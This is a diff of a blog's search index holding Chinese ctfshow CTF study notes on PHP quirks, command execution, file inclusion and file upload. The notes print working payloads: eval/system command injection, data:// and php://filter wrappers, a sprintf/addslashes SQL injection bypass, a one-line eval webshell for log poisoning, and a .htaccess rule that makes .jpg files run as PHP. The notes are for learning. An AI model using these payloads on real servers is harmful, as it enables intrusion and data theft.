+<h3 id="9-全局数组-GLOBALS"><a href="#9-全局数组-GLOBALS" class="headerlink" title="9. 全局数组$GLOBALS"></a>9. 全局数组$GLOBALS</h3><figure class="highlight php"><table><tr><td class="code"><pre><span class="line">全局数组<span class="variable">$GLOBALS</span>：引用全局作用域中可用的全部变量 一个包含了全部变量的全局组合数组</span><br><span class="line">    <span class="title function_ invoke__">var_dump</span>(<span class="variable">$GLOBALS</span>)    --输出全部信息</span><br></pre></td></tr></table></figure>
+
+<h3 id="10-proc-self-root"><a href="#10-proc-self-root" class="headerlink" title="10.&#x2F;proc&#x2F;self&#x2F;root"></a>10.&#x2F;proc&#x2F;self&#x2F;root</h3><figure class="highlight php"><table><tr><td class="code"><pre><span class="line">/proc/<span class="built_in">self</span>/root 是 Linux 系统中一个特殊的符号链接，它始终指向当前进程的根目录。</span><br></pre></td></tr></table></figure>
+
+<h3 id="11-post传参"><a href="#11-post传参" class="headerlink" title="11.post传参"></a>11.post传参</h3><figure class="highlight php"><table><tr><td class="code"><pre><span class="line">特性<span class="number">1</span>：被get或者post传入的变量名，如果含有 空格、+、[ 则会被转化为 _</span><br><span class="line">特性<span class="number">2</span>：就是如果传入 [ ，它被转化为 _ 之后，后面的字符就会被保留下来不会被替换  ---php8以前</span><br></pre></td></tr></table></figure>
+
+<h3 id="12-传参时"><a href="#12-传参时" class="headerlink" title="12.传参时"></a>12.传参时</h3><figure class="highlight php"><table><tr><td class="code"><pre><span class="line"><span class="title function_ invoke__">highlight_file</span>(<span class="variable">$_POST</span>[<span class="number">1</span>])&amp;<span class="number">1</span>=flag.php              --绕过关键字</span><br><span class="line"><span class="keyword">include</span>(<span class="variable">$_POST</span>[<span class="number">1</span>])&amp;<span class="number">1</span>=php:<span class="comment">//filter/               --文件包含</span></span><br><span class="line"></span><br></pre></td></tr></table></figure>
+
+<h3 id="13-eval函数与assert函数"><a href="#13-eval函数与assert函数" class="headerlink" title="13.eval函数与assert函数"></a>13.eval函数与assert函数</h3><figure class="highlight php"><table><tr><td class="code"><pre><span class="line">都用于执行php函数 </span><br></pre></td></tr></table></figure>
+
+<h3 id="14-SERVER-‘argv’"><a href="#14-SERVER-‘argv’" class="headerlink" title="14.$_SERVER[‘argv’]"></a>14.$_SERVER[‘argv’]</h3><figure class="highlight php"><table><tr><td class="code"><pre><span class="line"><span class="variable">$_SERVER</span>[‘argv’][<span class="number">0</span>] 就等于 <span class="variable">$_SERVER</span>[‘QUERY_STRING’]，<span class="variable">$_SERVER</span>[<span class="string">&quot;QUERY_STRING&quot;</span>] 就是查询 (query) 的字符串</span><br><span class="line">                                    ---URL中 ? 号后面的原始参数字符串（不解析，不解码，直接拿原样的 query <span class="keyword">string</span>）。</span><br><span class="line">                                    ---需要php.ini 开启了register_argc_argv 配置项。</span><br></pre></td></tr></table></figure>
+
+<h3 id="15-extract函数"><a href="#15-extract函数" class="headerlink" title="15.extract函数"></a>15.extract函数</h3><figure class="highlight php"><table><tr><td class="code"><pre><span class="line">从数组中将变量导入到当前的符号表</span><br><span class="line">一个关联数组。此函数会将键名当作变量名，值作为变量的值。 对每个键／值对都会在当前的符号表中建立变量</span><br><span class="line">    ---只需要键值对就行了?..CTFSHOW..=CTFSHOW&amp;isVIP=<span class="number">1</span>,这样也会解析              </span><br></pre></td></tr></table></figure>
+
+
+
+<h3 id="16-gettext拓展"><a href="#16-gettext拓展" class="headerlink" title="16.gettext拓展:"></a>16.gettext拓展:</h3><figure class="highlight plaintext"><figcaption><span>hp</span></figcaption><table><tr><td class="code"><pre><span class="line">gettext()等价于_()</span><br><span class="line">      --使用gettext()相当于echo </span><br></pre></td></tr></table></figure>
+
+<h3 id="17-stripos-函数"><a href="#17-stripos-函数" class="headerlink" title="17.stripos()函数:"></a>17.stripos()函数:</h3><figure class="highlight php"><table><tr><td class="code"><pre><span class="line">查找字符串首次出现的位置（不区分大小写）</span><br><span class="line">        --配合目录穿越使用../../../../../<span class="keyword">var</span>/www/html/flag.php</span><br></pre></td></tr></table></figure>
+
+<h3 id="18-正则表达式溢出"><a href="#18-正则表达式溢出" class="headerlink" title="18.正则表达式溢出:"></a>18.正则表达式溢出:</h3><figure class="highlight php"><table><tr><td class="code"><pre><span class="line">正则(pcre)最大回溯/递归限制</span><br><span class="line">    在使用.*?ctfshow非贪婪模式时--匹配到了ctfshow，但是如果ctfshow前面有<span class="number">10</span>万个字符，那么正则会返回<span class="literal">false</span></span><br><span class="line">        --使用非贪婪模式, 非贪婪模式匹配原理简单来说是, 在可配也可不配的情况下, 优先不匹配. 记录备选状态, 并将匹配控制交给正则表达式的下一个匹配字符, 当之后的匹配失败的时候, 再溯, 进行匹配.</span><br><span class="line">        --默认的backtrack_limit是<span class="number">100000</span></span><br></pre></td></tr></table></figure>
+
+<h3 id="19-php运算符优先级"><a href="#19-php运算符优先级" class="headerlink" title="19.php运算符优先级"></a>19.php运算符优先级</h3><table>
+<thead>
+<tr>
+<th>优先级</th>
+<th>运算符</th>
+<th>描述</th>
+<th>示例</th>
+</tr>
+</thead>
+<tbody><tr>
+<td>1</td>
+<td><code>()</code></td>
+<td>括号（表达式分组）</td>
+<td>&#96;($a &amp;&amp; $b)</td>
+</tr>
+<tr>
+<td>2</td>
+<td><code>!</code></td>
+<td>逻辑非</td>
+<td><code>!$a</code></td>
+</tr>
+<tr>
+<td>3</td>
+<td><code>* / %</code></td>
+<td>乘 &#x2F; 除 &#x2F; 取模</td>
+<td><code>$a * $b</code>, <code>$a % $b</code></td>
+</tr>
+<tr>
+<td>4</td>
+<td><code>+ -</code></td>
+<td>加 &#x2F; 减</td>
+<td><code>$a + $b</code></td>
+</tr>
+<tr>
+<td>5</td>
+<td><code>.</code></td>
+<td>字符串连接</td>
+<td><code>$a . $b</code></td>
+</tr>
+<tr>
+<td>6</td>
+<td><code>&lt; &gt; &lt;= &gt;=</code></td>
+<td>比较大小</td>
+<td><code>$a &lt; $b</code>, <code>$a &gt;= $b</code></td>
+</tr>
+<tr>
+<td>7</td>
+<td><code>== != === !==</code></td>
+<td>相等 &#x2F; 不等 &#x2F; 全等等</td>
+<td><code>$a === $b</code>, <code>$a != $b</code></td>
+</tr>
+<tr>
+<td>8</td>
+<td><code>&amp;</code></td>
+<td>按位与</td>
+<td><code>$a &amp; $b</code></td>
+</tr>
+<tr>
+<td>9</td>
+<td><code>^</code></td>
+<td>按位异或</td>
+<td><code>$a ^ $b</code></td>
+</tr>
+<tr>
+<td>10</td>
+<td>&#96;</td>
+<td>&#96;</td>
+<td>按位或</td>
+</tr>
+<tr>
+<td>11</td>
+<td><code>&amp;&amp;</code></td>
+<td>逻辑与（短路）</td>
+<td><code>$a &amp;&amp; $b</code></td>
+</tr>
+<tr>
+<td>12</td>
+<td>&#96;</td>
+<td></td>
+<td>&#96;</td>
+</tr>
+<tr>
+<td>13</td>
+<td><code>?:</code></td>
+<td>三元运算（条件表达式）</td>
+<td><code>$a ? $b : $c</code></td>
+</tr>
+<tr>
+<td>14</td>
+<td><code>=</code> <code>+=</code> <code>-=</code> 等</td>
+<td>赋值及复合赋值</td>
+<td><code>$a = $b</code>, <code>$a += 1</code></td>
+</tr>
+<tr>
+<td>15</td>
+<td><code>and</code></td>
+<td>逻辑与（低优先）</td>
+<td><code>$a = true and false</code></td>
+</tr>
+<tr>
+<td>16</td>
+<td><code>or</code></td>
+<td>逻辑或（最低优先）</td>
+<td><code>$a = false or true</code></td>
+</tr>
+</tbody></table>
+<h3 id="20-parse-str-函数"><a href="#20-parse-str-函数" class="headerlink" title="20.parse_str()函数:"></a>20.parse_str()函数:</h3><figure class="highlight php"><table><tr><td class="code"><pre><span class="line"><span class="title function_ invoke__">parse_str</span>(<span class="keyword">string</span> <span class="variable">$string</span>, <span class="keyword">array</span> &amp;<span class="variable">$result</span>): <span class="keyword">void</span></span><br><span class="line">如果 <span class="keyword">string</span> 是 URL 传递入的查询字符串（query <span class="keyword">string</span>），</span><br><span class="line">则将它解析为变量并设置到当前作用域（如果提供了 result 则会设置到该数组里 ）</span><br><span class="line">极度不建议在没有 result 参数的情况下使用此函数， 并且在 PHP <span class="number">7.2</span> 中将废弃不设置参数的行为。</span><br><span class="line">PHP <span class="number">8.0</span>.<span class="number">0</span> 起，result 参数是强制的。</span><br><span class="line">对于<span class="title function_ invoke__">parse_str</span>()，如果传入的是一个数组，例如arr[]=<span class="number">1</span>，则会将变量保存在数组当中arr[<span class="number">0</span>]=<span class="number">1</span>;</span><br></pre></td></tr></table></figure>
+
+<h3 id="21-类"><a href="#21-类" class="headerlink" title="21.类"></a>21.类</h3><h4 id="1-非静态方法-无static"><a href="#1-非静态方法-无static" class="headerlink" title="1.非静态方法(无static)"></a>1.非静态方法(无static)</h4><figure class="highlight php"><table><tr><td class="code"><pre><span class="line">直接<span class="keyword">new</span>一个对象，通过对象来进行调用</span><br></pre></td></tr></table></figure>
+
+<h4 id="2-静态方法-static"><a href="#2-静态方法-static" class="headerlink" title="2.静态方法(static)"></a>2.静态方法(static)</h4><figure class="highlight php"><table><tr><td class="code"><pre><span class="line">静态方法在类ctfshow，限制了不能去<span class="keyword">new</span>，直接::调用即可</span><br></pre></td></tr></table></figure>
+
+<h3 id="22-call-user-func-函数与call-user-func-array-函数类似"><a href="#22-call-user-func-函数与call-user-func-array-函数类似" class="headerlink" title="22.call_user_func()函数与call_user_func_array()函数类似:"></a>22.call_user_func()函数与call_user_func_array()函数类似:</h3><figure class="highlight php"><table><tr><td class="code"><pre><span class="line"><span class="title function_ invoke__">call_user_func</span>(<span class="keyword">callable</span> <span class="variable">$callback</span>, <span class="keyword">mixed</span> ...<span class="variable">$args</span>): <span class="keyword">mixed</span></span><br><span class="line">                 第一个参数 callback 是被调用的回调函数，其余参数是回调函数的参数。</span><br><span class="line"> --如果传递一个数组，对于类来说，会把数组的第一个元素当作类名，第二个元素当作类的函数</span><br></pre></td></tr></table></figure>
+
+<h3 id="23-PHP-弱类型特性"><a href="#23-PHP-弱类型特性" class="headerlink" title="23.PHP 弱类型特性(&#x3D;&#x3D;)"></a>23.PHP 弱类型特性(&#x3D;&#x3D;)</h3><figure class="highlight php"><table><tr><td class="code"><pre><span class="line">PHP 弱比较 == 的转换规则：</span><br><span class="line">   如果一边是数字，另一边是字符串，PHP 会尝试把字符串转换为数字！  </span><br></pre></td></tr></table></figure>
+
+<table>
+<thead>
+<tr>
+<th>比较类型</th>
+<th>PHP行为</th>
+</tr>
+</thead>
+<tbody><tr>
+<td>数字 vs 字符串</td>
+<td>字符串会被<strong>强制转换为数字</strong>再比较</td>
+</tr>
+<tr>
+<td>字符串 vs 字符串（若一方看起来像数字）</td>
+<td>会尝试<strong>两边都转成数字</strong>再比较</td>
+</tr>
+<tr>
+<td>布尔 vs 任意类型</td>
+<td>会都转成布尔值再比较</td>
+</tr>
+<tr>
+<td>数组&#x2F;对象 vs 标量</td>
+<td>一律为 <code>false</code></td>
+</tr>
+</tbody></table>
+<h3 id="24-create-function-函数"><a href="#24-create-function-函数" class="headerlink" title="24.create_function()函数:"></a>24.create_function()函数:</h3><figure class="highlight php"><table><tr><td class="code"><pre><span class="line">函数已自 PHP <span class="number">7.2</span>.<span class="number">0</span> 起被废弃，并自 PHP <span class="number">8.0</span>.<span class="number">0</span> 起被移除。</span><br><span class="line">    <span class="title function_ invoke__">create_function</span>(<span class="keyword">string</span> <span class="variable">$args</span>, <span class="keyword">string</span> <span class="variable">$code</span>): <span class="keyword">string</span>    第一个</span><br></pre></td></tr></table></figure>
+
+]]></content>
+      <categories>
+        <category>ctfshow</category>
+      </categories>
+      <tags>
+        <tag>ctfshow</tag>
+      </tags>
+  </entry>
+  <entry>
     <title>ssrf</title>
     <url>/2025/06/02/ctfshow/ssrf/</url>
     <content><![CDATA[<h1 id="SSRF的运用原理"><a href="#SSRF的运用原理" class="headerlink" title="SSRF的运用原理:"></a>SSRF的运用原理:</h1><h2 id="1-原理"><a href="#1-原理" class="headerlink" title="1.原理:"></a>1.原理:</h2><p>利用存在漏洞的服务器，向内部或外部资源发送伪造的请求，从而达到以下目的：</p>
@@ -2294,6 +2294,25 @@
       </tags>
   </entry>
   <entry>
+    <title>常用姿势</title>
+    <url>/2025/06/02/ctfshow/%E5%B8%B8%E7%94%A8%E5%A7%BF%E5%8A%BF/</url>
+    <content><![CDATA[<h1 id="php"><a href="#php" class="headerlink" title="php"></a>php</h1><h2 id="1-sprintf函数"><a href="#1-sprintf函数" class="headerlink" title="1.sprintf函数:"></a>1.sprintf函数:</h2><figure class="highlight php"><table><tr><td class="code"><pre><span class="line">作用是将格式化字符串写入变量中</span><br><span class="line">函数形式为<span class="title function_ invoke__">sprintf</span>(format,arg1,arg2,arg++)</span><br></pre></td></tr></table></figure>
+
+<figure class="highlight php"><table><tr><td class="code"><pre><span class="line">不带占位符:</span><br><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line"><span class="variable">$sql</span>=<span class="string">&quot;select * from user where username=&#x27;%\&#x27; and 1=1 #&#x27;;&quot;</span>;  </span><br><span class="line"><span class="variable">$user</span>=<span class="string">&#x27;admin&#x27;</span>;</span><br><span class="line"><span class="keyword">echo</span> <span class="title function_ invoke__">sprintf</span>(<span class="variable">$sql</span>,<span class="variable">$user</span>); </span><br><span class="line"><span class="comment">/* %\会被认为是占位符类似%s，但是admin没有匹配，结果会变为select * from user where username=&#x27;%\&#x27; and 1=1 #&#x27;;</span></span><br><span class="line"><span class="comment">*/</span></span><br><span class="line"><span class="meta">?&gt;</span></span><br><span class="line">有占位符:  %<span class="number">1</span>$\  是一样的道理%<span class="number">1</span>$\会消失</span><br></pre></td></tr></table></figure>
+
+<hr>
+<hr>
+<figure class="highlight php"><table><tr><td class="code"><pre><span class="line"><span class="comment">//addslashes()函数：在预定义前面加反斜杠，预定义符有单引号（&#x27;），双引号（&quot;），反斜杠（\），NULL</span></span><br><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line"><span class="variable">$pass</span>=<span class="title function_ invoke__">sprintf</span>(<span class="string">&quot;and pass=&#x27;%s&#x27;&quot;</span>,<span class="title function_ invoke__">addslashes</span>(<span class="variable">$_GET</span>[<span class="string">&#x27;pass&#x27;</span>]));</span><br><span class="line"><span class="variable">$sql</span>=<span class="title function_ invoke__">sprintf</span>(<span class="string">&quot;select * from user where name=&#x27;%s&#x27; <span class="subst">$pass</span>&quot;</span>,<span class="title function_ invoke__">addslashes</span>(<span class="variable">$_GET</span>[<span class="string">&#x27;name&#x27;</span>]));</span><br><span class="line"><span class="meta">?&gt;</span></span><br><span class="line"> 当传入pass= %<span class="number">1</span>$<span class="string">&#x27; and 1=1 #     </span></span><br><span class="line"><span class="string">    得到 and pass=&#x27;</span>%<span class="number">1</span>$\<span class="string">&#x27; and 1=1 #&#x27;</span></span><br><span class="line">      之后第三步 select * <span class="keyword">from</span> user where name=<span class="string">&#x27;&#x27;</span> <span class="keyword">and</span> pass=<span class="string">&#x27;%1$\&#x27; and 1=1 #&#x27;</span>   但是%<span class="number">1</span>$\会消失</span><br></pre></td></tr></table></figure>
+
+<h1 id="linxu命令"><a href="#linxu命令" class="headerlink" title="linxu命令:"></a>linxu命令:</h1><h2 id="1-使用-可以分隔两个命令一起执行"><a href="#1-使用-可以分隔两个命令一起执行" class="headerlink" title="1.使用;可以分隔两个命令一起执行"></a>1.使用;可以分隔两个命令一起执行</h2>]]></content>
+      <categories>
+        <category>ctfshow</category>
+      </categories>
+      <tags>
+        <tag>ctfshow</tag>
+      </tags>
+  </entry>
+  <entry>
     <title>命令执行</title>
     <url>/2025/06/02/ctfshow/%E5%91%BD%E4%BB%A4%E6%89%A7%E8%A1%8C/</url>
     <content><![CDATA[<h2 id="命令执行"><a href="#命令执行" class="headerlink" title="命令执行"></a>命令执行</h2><figure class="highlight php"><table><tr><td class="code"><pre><span class="line">?c=<span class="title function_ invoke__">system</span>(<span class="string">&#x27;cat f*&#x27;</span>);              --通过*通配符来绕过检测</span><br><span class="line">         也可以用cat f???</span><br><span class="line">?c=<span class="keyword">echo</span> `ls`;                     --在Shell 脚本或命令行中，反引号` ` 和 $() 用于执行命令并获取其输出。</span><br><span class="line">            --反引号 是“shell 执行操作符” —— 类似于<span class="title function_ invoke__">shell_exec</span>()`</span><br><span class="line">?c=<span class="keyword">eval</span>(<span class="variable">$_GET</span>[<span class="number">1</span>]);&amp;<span class="number">1</span>=<span class="title function_ invoke__">system</span>(<span class="string">&#x27;tac flag.php&#x27;</span>);        --<span class="keyword">eval</span>() 会把传入的字符串当成PHP代码执行。</span><br><span class="line">?c=<span class="keyword">include</span><span class="variable">$_GET</span>[<span class="number">1</span>]<span class="meta">?&gt;</span>&amp;<span class="number">1</span>=php:<span class="comment">//filter/convert.base64-encode/resource=flag.php      --include期望一个字符串形式的文件名或路径。</span></span><br><span class="line">c=data:<span class="comment">//text/plain,&lt;?php system(&quot;cat f*&quot;)?&gt;            --将输入的作为代码执行</span></span><br><span class="line"></span><br></pre></td></tr></table></figure>
@@ -2402,6 +2421,35 @@
 
 
 
+
+]]></content>
+      <categories>
+        <category>ctfshow</category>
+      </categories>
+      <tags>
+        <tag>ctfshow</tag>
+      </tags>
+  </entry>
+  <entry>
+    <title>文件包含</title>
+    <url>/2025/06/02/ctfshow/%E6%96%87%E4%BB%B6%E5%8C%85%E5%90%AB/</url>
+    <content><![CDATA[<h2 id="文件包含"><a href="#文件包含" class="headerlink" title="文件包含"></a>文件包含</h2><h3 id="包含函数"><a href="#包含函数" class="headerlink" title="包含函数"></a>包含函数</h3><figure class="highlight php"><table><tr><td class="code"><pre><span class="line">- <span class="keyword">include</span>：找不到被包含的文件时只会产生警告，脚本将继续执行。</span><br><span class="line">- <span class="keyword">include_once</span>：和<span class="keyword">include</span>()语句类似，唯一区别是如果该文件中的代码已经被包含，则不会再次包含。</span><br><span class="line">- <span class="keyword">require</span>：找不到被包含的文件时会产生致命错误，并停止脚本。</span><br><span class="line">- <span class="keyword">require_once</span>：和<span class="keyword">require</span>()语句类似，唯一区别是如果该文件中的代码已经被包含，则不会再次包含。</span><br><span class="line">- <span class="title function_ invoke__">filter</span>():也可以包含伪协议</span><br></pre></td></tr></table></figure>
+
+
+
+<h3 id="1-通过伪协议"><a href="#1-通过伪协议" class="headerlink" title="1.通过伪协议"></a>1.通过伪协议</h3><figure class="highlight php"><table><tr><td class="code"><pre><span class="line"><span class="number">1</span>.php:<span class="comment">//filter  主要用于读取源码</span></span><br><span class="line"><span class="number">2</span>.php:<span class="comment">//input  经常使用file_get_contents获取php://input内容</span></span><br><span class="line"><span class="number">3</span>.data:<span class="comment">//  执行命令      </span></span><br><span class="line"><span class="number">4</span>.file:<span class="comment">//  访问本地文件系统</span></span><br><span class="line"><span class="number">5</span>.compress.zlib:<span class="comment">//     协议用于读取压缩文件</span></span><br></pre></td></tr></table></figure>
+
+<h4 id="1-php-filter-使用方法"><a href="#1-php-filter-使用方法" class="headerlink" title="1.php:&#x2F;&#x2F;filter 使用方法"></a>1.php:&#x2F;&#x2F;filter 使用方法</h4><figure class="highlight php"><table><tr><td class="code"><pre><span class="line">php:<span class="comment">//filter/read=过滤器名/resource=目标文件        --基本格式     --read可以改为write </span></span><br><span class="line">                                        --默认是read，有时可不写read,可以不加过滤器</span><br><span class="line">一些过滤器:</span><br><span class="line">            convert.base64-encode	base64 编码输出</span><br><span class="line">            convert.base64-decode	base64 解码输入</span><br><span class="line">            convert.quoted-printable-encode	quoted-printable 编码</span><br><span class="line">            <span class="keyword">string</span>.strip_tags	去除 HTML/PHP 标签      --php7.<span class="number">3</span>.x后废弃</span><br><span class="line">            <span class="keyword">string</span>.rot13	ROT13 替换加密</span><br><span class="line">            <span class="keyword">string</span>.toupper	字母转大写</span><br><span class="line">            <span class="keyword">string</span>.tolower	字母转小写</span><br><span class="line">                </span><br></pre></td></tr></table></figure>
+
+<h4 id="2-php-input-使用方法"><a href="#2-php-input-使用方法" class="headerlink" title="2.php:&#x2F;&#x2F;input 使用方法:"></a>2.php:&#x2F;&#x2F;input 使用方法:</h4><figure class="highlight php"><table><tr><td class="code"><pre><span class="line">php:<span class="comment">//input                            --用于读取 HTTP 请求体的原始内容</span></span><br></pre></td></tr></table></figure>
+
+<h4 id="3-data-使用方法"><a href="#3-data-使用方法" class="headerlink" title="3.data:&#x2F;&#x2F;使用方法"></a>3.data:&#x2F;&#x2F;使用方法</h4><figure class="highlight php"><table><tr><td class="code"><pre><span class="line">data:<span class="comment">//&lt;mediatype&gt;[;base64],&lt;data&gt;       --mediatype（MIME类型）比如：text/plain、text/html  </span></span><br><span class="line">                               --data，必须是完整的php代码</span><br><span class="line">mediatype（MIME类型）:</span><br><span class="line">                    text/plain	纯文本	✅ 推荐，用于执行 PHP 代码</span><br><span class="line">                    text/html	HTML 格式	✅ 也能执行 PHP，显示为网页</span><br><span class="line">                    text/xml	XML 格式	通常用于接口测试</span><br><span class="line">                    application/json	JSON 数据	多用于 API</span><br><span class="line">                    application/x-www-form-urlencoded	表单数据（普通POST）	API 数据传输</span><br><span class="line">                    application/javascript	JS 脚本	通常用于网页环境，不用于PHP</span><br><span class="line">                    image/png	图片	不适合执行 PHP</span><br></pre></td></tr></table></figure>
+
+<h4 id="4-file-使用方法"><a href="#4-file-使用方法" class="headerlink" title="4.file:&#x2F;&#x2F;使用方法"></a>4.file:&#x2F;&#x2F;使用方法</h4><figure class="highlight php"><table><tr><td class="code"><pre><span class="line">file:<span class="comment">//绝对路径                 </span></span><br></pre></td></tr></table></figure>
+
+
+
+<h3 id="2-通过日志"><a href="#2-通过日志" class="headerlink" title="2.通过日志"></a>2.通过日志</h3><figure class="highlight php"><table><tr><td class="code"><pre><span class="line">?url=/<span class="keyword">var</span>/log/nginx/access.log     --通过nginx中日志的路径</span><br><span class="line"><span class="meta">&lt;?php</span> @<span class="keyword">eval</span>(<span class="variable">$_POST</span>[<span class="string">&#x27;a&#x27;</span>]);<span class="meta">?&gt;</span>      --一句话木马</span><br><span class="line"><span class="meta">&lt;?php</span> <span class="title function_ invoke__">phpinfo</span>();<span class="meta">?&gt;</span>         --查看配置信息</span><br></pre></td></tr></table></figure>
 
 ]]></content>
       <categories>
@@ -3116,25 +3164,6 @@
       </tags>
   </entry>
   <entry>
-    <title>常用姿势</title>
-    <url>/2025/06/02/ctfshow/%E5%B8%B8%E7%94%A8%E5%A7%BF%E5%8A%BF/</url>
-    <content><![CDATA[<h1 id="php"><a href="#php" class="headerlink" title="php"></a>php</h1><h2 id="1-sprintf函数"><a href="#1-sprintf函数" class="headerlink" title="1.sprintf函数:"></a>1.sprintf函数:</h2><figure class="highlight php"><table><tr><td class="code"><pre><span class="line">作用是将格式化字符串写入变量中</span><br><span class="line">函数形式为<span class="title function_ invoke__">sprintf</span>(format,arg1,arg2,arg++)</span><br></pre></td></tr></table></figure>
-
-<figure class="highlight php"><table><tr><td class="code"><pre><span class="line">不带占位符:</span><br><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line"><span class="variable">$sql</span>=<span class="string">&quot;select * from user where username=&#x27;%\&#x27; and 1=1 #&#x27;;&quot;</span>;  </span><br><span class="line"><span class="variable">$user</span>=<span class="string">&#x27;admin&#x27;</span>;</span><br><span class="line"><span class="keyword">echo</span> <span class="title function_ invoke__">sprintf</span>(<span class="variable">$sql</span>,<span class="variable">$user</span>); </span><br><span class="line"><span class="comment">/* %\会被认为是占位符类似%s，但是admin没有匹配，结果会变为select * from user where username=&#x27;%\&#x27; and 1=1 #&#x27;;</span></span><br><span class="line"><span class="comment">*/</span></span><br><span class="line"><span class="meta">?&gt;</span></span><br><span class="line">有占位符:  %<span class="number">1</span>$\  是一样的道理%<span class="number">1</span>$\会消失</span><br></pre></td></tr></table></figure>
-
-<hr>
-<hr>
-<figure class="highlight php"><table><tr><td class="code"><pre><span class="line"><span class="comment">//addslashes()函数：在预定义前面加反斜杠，预定义符有单引号（&#x27;），双引号（&quot;），反斜杠（\），NULL</span></span><br><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line"><span class="variable">$pass</span>=<span class="title function_ invoke__">sprintf</span>(<span class="string">&quot;and pass=&#x27;%s&#x27;&quot;</span>,<span class="title function_ invoke__">addslashes</span>(<span class="variable">$_GET</span>[<span class="string">&#x27;pass&#x27;</span>]));</span><br><span class="line"><span class="variable">$sql</span>=<span class="title function_ invoke__">sprintf</span>(<span class="string">&quot;select * from user where name=&#x27;%s&#x27; <span class="subst">$pass</span>&quot;</span>,<span class="title function_ invoke__">addslashes</span>(<span class="variable">$_GET</span>[<span class="string">&#x27;name&#x27;</span>]));</span><br><span class="line"><span class="meta">?&gt;</span></span><br><span class="line"> 当传入pass= %<span class="number">1</span>$<span class="string">&#x27; and 1=1 #     </span></span><br><span class="line"><span class="string">    得到 and pass=&#x27;</span>%<span class="number">1</span>$\<span class="string">&#x27; and 1=1 #&#x27;</span></span><br><span class="line">      之后第三步 select * <span class="keyword">from</span> user where name=<span class="string">&#x27;&#x27;</span> <span class="keyword">and</span> pass=<span class="string">&#x27;%1$\&#x27; and 1=1 #&#x27;</span>   但是%<span class="number">1</span>$\会消失</span><br></pre></td></tr></table></figure>
-
-<h1 id="linxu命令"><a href="#linxu命令" class="headerlink" title="linxu命令:"></a>linxu命令:</h1><h2 id="1-使用-可以分隔两个命令一起执行"><a href="#1-使用-可以分隔两个命令一起执行" class="headerlink" title="1.使用;可以分隔两个命令一起执行"></a>1.使用;可以分隔两个命令一起执行</h2>]]></content>
-      <categories>
-        <category>ctfshow</category>
-      </categories>
-      <tags>
-        <tag>ctfshow</tag>
-      </tags>
-  </entry>
-  <entry>
     <title>文件上传</title>
     <url>/2025/06/02/ctfshow/%E6%96%87%E4%BB%B6%E4%B8%8A%E4%BC%A0/</url>
     <content><![CDATA[<h2 id="文件上传"><a href="#文件上传" class="headerlink" title="文件上传"></a>文件上传</h2><h3 id="1-user-ini的使用"><a href="#1-user-ini的使用" class="headerlink" title="1. .user.ini的使用:"></a>1. .user.ini的使用:</h3><figure class="highlight php"><table><tr><td class="code"><pre><span class="line">原理: 指定一个文件（如a.jpg），那么该文件就会被包含在要执行的php文件中（如index.php），类似于在index.php中插入一句：<span class="keyword">require</span>(./a.jpg);这两个设置的区别只是在于auto_prepend_file是在文件前插入；auto_append_file在文件最后插入（当文件调用的有<span class="keyword">exit</span>()时该设置无效）所以要求当前目录必须要有php文件,巧合的是这题upload目录下有个index.php所以这种方式是可以成功的。</span><br><span class="line">    --必须在upload目录下有index.php这样才成功，没有可以尝试上传一个</span><br><span class="line">                                       --auto_append_file在木马文件上传后上传</span><br><span class="line">                                       --auto_prepend_file在木马文件上传前上传</span><br></pre></td></tr></table></figure>
@@ -3263,35 +3292,6 @@
 </tbody></table>
 <h3 id="6-通过-htaccess包含"><a href="#6-通过-htaccess包含" class="headerlink" title="6.通过.htaccess包含:"></a>6.通过.htaccess包含:</h3><p>httpd,httpd是apache的服务，关于apache的文件上传中有一个.htaccess配置文件，可以进行文件包含</p>
 <figure class="highlight php"><table><tr><td class="code"><pre><span class="line">文件为.htaccess</span><br><span class="line">    内容:</span><br><span class="line"></span><br><span class="line">    &lt;FilesMatch <span class="string">&quot;\.jpg&quot;</span>&gt;</span><br><span class="line">  SetHandler application/x-httpd-php</span><br><span class="line">&lt;/FilesMatch&gt;</span><br></pre></td></tr></table></figure>
-
-]]></content>
-      <categories>
-        <category>ctfshow</category>
-      </categories>
-      <tags>
-        <tag>ctfshow</tag>
-      </tags>
-  </entry>
-  <entry>
-    <title>文件包含</title>
-    <url>/2025/06/02/ctfshow/%E6%96%87%E4%BB%B6%E5%8C%85%E5%90%AB/</url>
-    <content><![CDATA[<h2 id="文件包含"><a href="#文件包含" class="headerlink" title="文件包含"></a>文件包含</h2><h3 id="包含函数"><a href="#包含函数" class="headerlink" title="包含函数"></a>包含函数</h3><figure class="highlight php"><table><tr><td class="code"><pre><span class="line">- <span class="keyword">include</span>：找不到被包含的文件时只会产生警告，脚本将继续执行。</span><br><span class="line">- <span class="keyword">include_once</span>：和<span class="keyword">include</span>()语句类似，唯一区别是如果该文件中的代码已经被包含，则不会再次包含。</span><br><span class="line">- <span class="keyword">require</span>：找不到被包含的文件时会产生致命错误，并停止脚本。</span><br><span class="line">- <span class="keyword">require_once</span>：和<span class="keyword">require</span>()语句类似，唯一区别是如果该文件中的代码已经被包含，则不会再次包含。</span><br><span class="line">- <span class="title function_ invoke__">filter</span>():也可以包含伪协议</span><br></pre></td></tr></table></figure>
-
-
-
-<h3 id="1-通过伪协议"><a href="#1-通过伪协议" class="headerlink" title="1.通过伪协议"></a>1.通过伪协议</h3><figure class="highlight php"><table><tr><td class="code"><pre><span class="line"><span class="number">1</span>.php:<span class="comment">//filter  主要用于读取源码</span></span><br><span class="line"><span class="number">2</span>.php:<span class="comment">//input  经常使用file_get_contents获取php://input内容</span></span><br><span class="line"><span class="number">3</span>.data:<span class="comment">//  执行命令      </span></span><br><span class="line"><span class="number">4</span>.file:<span class="comment">//  访问本地文件系统</span></span><br><span class="line"><span class="number">5</span>.compress.zlib:<span class="comment">//     协议用于读取压缩文件</span></span><br></pre></td></tr></table></figure>
-
